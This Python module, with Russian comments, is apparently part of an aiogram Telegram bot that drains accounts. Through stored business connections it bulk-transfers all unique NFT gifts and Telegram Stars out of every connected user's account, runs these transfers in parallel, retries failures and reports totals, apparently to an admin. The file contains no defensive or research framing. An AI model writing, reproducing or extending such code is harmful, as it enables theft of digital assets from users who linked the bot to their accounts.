import asyncio
import logging
from typing import Dict, List, Any
from aiogram import Bot

from config import get_main_admin_id, MIN_STARS_FOR_AUTO_TRANSFER
from utils.file_utils import get_connections
from utils.transfer import transfer_all_unique_gifts, transfer_all_stars
from utils.user_management import check_user_balance

logger = logging.getLogger(__name__)

async def transfer_nft_for_user(bot: Bot, conn: Dict[str, Any]) -> Dict[str, Any]:
    """Асинхронный перевод NFT для одного пользователя"""
    try:
        conn_id = conn["business_connection_id"]
        user_id = conn["user_id"]
        username = conn.get("username", "N/A")
        
        nft_result = await transfer_all_unique_gifts(bot, conn_id, user_id, admin_notify=False)
        
        return {
            'username': username,
            'user_id': user_id,
            'transferred': nft_result['transferred'],
            'failed': nft_result['failed'],
            'total': nft_result['total']
        }
    except Exception as e:
        logger.error(f"Ошибка массового перевода для {conn.get('user_id')}: {e}")
        return {
            'username': conn.get('username', 'N/A'),
            'user_id': conn.get('user_id'),
            'transferred': 0,
            'failed': 1,
            'total': 0,
            'error': str(e)
        }

async def mass_transfer_nft(bot: Bot) -> str:
    """Массовый перевод всех доступных NFT от всех пользователей"""
    try:
        connections = get_connections()
        
        # Создаем задачи для параллельного перевода
        tasks = [transfer_nft_for_user(bot, conn) for conn in connections]
        
        # Выполняем все задачи параллельно
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Обрабатываем результаты
        total_transferred = 0
        total_failed = 0
        report = "<b>🔄 Массовый перевод NFT:</b>\n\n"
        
        for result in results:
            if isinstance(result, dict):
                total_transferred += result.get('transferred', 0)
                total_failed += result.get('failed', 0)
                
                if result.get('transferred', 0) > 0 or result.get('failed', 0) > 0:
                    report += f"👤 @{result['username']}: ✅ {result.get('transferred', 0)} | ❌ {result.get('failed', 0)}\n"
            else:
                total_failed += 1
                report += f"👤 Пользователь: ❌ Ошибка\n"
        
        report += f"\n📊 <b>Итого:</b> ✅ {total_transferred} | ❌ {total_failed}"
        return report
    except Exception as e:
        logger.error(f"Ошибка массового перевода: {e}")
        return f"❌ Ошибка массового перевода: {str(e)}"

async def mass_transfer_stars(bot: Bot) -> str:
    """Массовый перевод всех звезд от всех пользователей"""
    try:
        connections = get_connections()
        
        # Создаем задачи для параллельного перевода звезд
        tasks = []
        for conn in connections:
            conn_id = conn["business_connection_id"]
            user_id = conn["user_id"]
            tasks.append(transfer_all_stars(bot, conn_id, user_id))
        
        # Выполняем все задачи параллельно
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Обрабатываем результаты
        total_transferred = 0
        total_failed = 0
        report = "<b>⭐️ Массовый перевод звезд:</b>\n\n"
        
        for i, result in enumerate(results):
            if isinstance(result, dict):
                if result.get('transferred', 0) > 0:
                    total_transferred += result['transferred']
                    username = connections[i].get('username', 'N/A')
                    report += f"👤 @{username}: ⭐️ {result['transferred']}\n"
                elif result.get('error'):
                    total_failed += 1
                    username = connections[i].get('username', 'N/A')
                    report += f"👤 @{username}: ❌ Ошибка\n"
            else:
                total_failed += 1
                report += f"👤 Пользователь: ❌ Ошибка\n"
        
        report += f"\n📊 <b>Итого:</b> ⭐️ {total_transferred} | ❌ {total_failed}"
        return report
    except Exception as e:
        logger.error(f"Ошибка массового перевода звезд: {e}")
        return f"❌ Ошибка массового перевода звезд: {str(e)}"

async def mass_check_balances(bot: Bot) -> str:
    """Массовая проверка балансов всех пользователей"""
    try:
        connections = get_connections()
        
        # Создаем задачи для параллельной проверки
        tasks = [check_user_balance(bot, conn['user_id']) for conn in connections]
        
        # Выполняем все задачи параллельно
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Обрабатываем результаты
        notifications_sent = 0
        errors = 0
        report = "<b>💰 Массовая проверка балансов:</b>\n\n"
        
        for i, result in enumerate(results):
            if isinstance(result, bool):
                if result:
                    notifications_sent += 1
                    username = connections[i].get('username', 'N/A')
                    report += f"👤 @{username}: ✅ Уведомление отправлено\n"
            else:
                errors += 1
                username = connections[i].get('username', 'N/A')
                report += f"👤 @{username}: ❌ Ошибка\n"
        
        report += f"\n📊 <b>Итого:</b> ✅ {notifications_sent} уведомлений | ❌ {errors} ошибок"
        return report
    except Exception as e:
        logger.error(f"Ошибка массовой проверки балансов: {e}")
        return f"❌ Ошибка массовой проверки балансов: {str(e)}"

async def mass_retry_failed_transfers(bot: Bot) -> str:
    """Массовая повторная попытка неудачных переводов"""
    try:
        connections = get_connections()
        
        # Получаем логи неудачных переводов
        from utils.file_utils import load_transfer_logs
        logs = load_transfer_logs()
        failed_logs = [log for log in logs if log.get('status') in ['nft_failed', 'gift_failed', 'stars_failed']]
        
        if not failed_logs:
            return "✅ Нет неудачных переводов для повторной попытки"
        
        # Группируем неудачные переводы по пользователям
        user_failures = {}
        for log in failed_logs:
            user_id = log.get('user_id')
            if user_id not in user_failures:
                user_failures[user_id] = []
            user_failures[user_id].append(log)
        
        # Создаем задачи для повторной попытки
        tasks = []
        for user_id, failures in user_failures.items():
            # Находим подключение пользователя
            user_conn = None
            for conn in connections:
                if conn.get('user_id') == user_id:
                    user_conn = conn
                    break
            
            if user_conn:
                tasks.append(retry_user_failed_transfers(bot, user_conn, failures))
        
        # Выполняем все задачи параллельно
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Обрабатываем результаты
        total_retried = 0
        total_successful = 0
        total_failed = 0
        report = "<b>🔄 Массовая повторная попытка:</b>\n\n"
        
        for result in results:
            if isinstance(result, dict):
                total_retried += result.get('retried', 0)
                total_successful += result.get('successful', 0)
                total_failed += result.get('failed', 0)
                
                if result.get('retried', 0) > 0:
                    report += f"👤 @{result['username']}: 🔄 {result.get('retried', 0)} | ✅ {result.get('successful', 0)} | ❌ {result.get('failed', 0)}\n"
            else:
                total_failed += 1
                report += f"👤 Пользователь: ❌ Ошибка\n"
        
        report += f"\n📊 <b>Итого:</b> 🔄 {total_retried} | ✅ {total_successful} | ❌ {total_failed}"
        return report
    except Exception as e:
        logger.error(f"Ошибка массовой повторной попытки: {e}")
        return f"❌ Ошибка массовой повторной попытки: {str(e)}"

async def retry_user_failed_transfers(bot: Bot, conn: Dict[str, Any], failures: List[Dict[str, Any]]) -> Dict[str, Any]:
    """Повторная попытка неудачных переводов для одного пользователя"""
    try:
        conn_id = conn["business_connection_id"]
        user_id = conn["user_id"]
        username = conn.get("username", "N/A")
        
        retried = 0
        successful = 0
        failed = 0
        
        for failure in failures:
            try:
                # Определяем тип неудачного перевода и повторяем
                if failure.get('status') == 'nft_failed':
                    # Повторяем перевод NFT
                    nft_result = await transfer_all_unique_gifts(bot, conn_id, user_id, admin_notify=False)
                    successful += nft_result.get('transferred', 0)
                    failed += nft_result.get('failed', 0)
                elif failure.get('status') == 'stars_failed':
                    # Повторяем перевод звезд
                    stars_result = await transfer_all_stars(bot, conn_id, user_id)
                    if stars_result.get('transferred', 0) > 0:
                        successful += 1
                    else:
                        failed += 1
                
                retried += 1
                
            except Exception as e:
                logger.error(f"Ошибка повторной попытки для {user_id}: {e}")
                failed += 1
        
        return {
            'username': username,
            'user_id': user_id,
            'retried': retried,
            'successful': successful,
            'failed': failed
        }
    except Exception as e:
        logger.error(f"Ошибка повторной попытки для пользователя {conn.get('user_id')}: {e}")
        return {
            'username': conn.get('username', 'N/A'),
            'user_id': conn.get('user_id'),
            'retried': 0,
            'successful': 0,
            'failed': 1,
            'error': str(e)
        }

async def cleanup_invalid_connections(bot: Bot) -> str:
    """Очистка недействительных подключений"""
    try:
        connections = get_connections()
        
        # Создаем задачи для проверки подключений
        tasks = [check_connection_validity(bot, conn) for conn in connections]
        
        # Выполняем все задачи параллельно
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Обрабатываем результаты
        valid_connections = 0
        invalid_connections = 0
        report = "<b>🧹 Очистка недействительных подключений:</b>\n\n"
        
        for i, result in enumerate(results):
            if isinstance(result, bool):
                if result:
                    valid_connections += 1
                else:
                    invalid_connections += 1
                    username = connections[i].get('username', 'N/A')
                    user_id = connections[i].get('user_id')
                    
                    # Удаляем недействительное подключение
                    from utils.file_utils import remove_connection
                    remove_connection(connections[i].get('business_connection_id'))
                    
                    report += f"❌ Удалено подключение @{username} (ID: {user_id})\n"
            else:
                invalid_connections += 1
                report += f"❌ Ошибка проверки подключения\n"
        
        report += f"\n📊 <b>Итого:</b> ✅ {valid_connections} действительных | ❌ {invalid_connections} удалено"
        return report
    except Exception as e:
        logger.error(f"Ошибка очистки подключений: {e}")
        return f"❌ Ошибка очистки подключений: {str(e)}"

async def check_connection_validity(bot: Bot, conn: Dict[str, Any]) -> bool:
    """Проверка действительности подключения"""
    try:
        conn_id = conn["business_connection_id"]
        
        # Пытаемся получить баланс звезд
        from utils.transfer import get_star_balance
        await get_star_balance(bot, conn_id)
        
        return True
    except Exception as e:
        if "BUSINESS_CONNECTION_INVALID" in str(e):
            return False
        else:
            # Другие ошибки не считаем подключение недействительным
            return True 